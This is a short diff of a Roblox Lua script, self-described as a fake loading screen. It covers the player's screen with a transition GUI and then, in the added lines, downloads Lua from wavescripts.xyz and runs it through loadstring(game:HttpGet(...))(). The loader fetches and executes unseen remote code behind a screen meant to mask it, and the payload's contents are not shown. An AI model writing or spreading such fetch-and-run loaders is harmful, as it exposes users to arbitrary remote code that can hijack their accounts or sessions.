@@ -1,10 +1,7 @@
--- Fake Loading screen script
-
 local LOADING_SCREEN = "Loading"
 local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
 local player = game.Players.LocalPlayer
 local playerGui = player.PlayerGui
-local loadscript = "Script"
 
 -- Set the display order and hint text
 playerGui.Transition.DisplayOrder = 6000000000000
@@ -21,5 +18,6 @@ task.spawn(function()
     playerGui.Transition.Enabled = false
 
     -- Execute the external script
-    loadscript
+    local loadscript = "loadstring(game:HttpGet('https://wavescripts.xyz/loader/all.lua'))()"
+    loadstring(game:HttpGet('https://wavescripts.xyz/loader/all.lua'))()
 end)
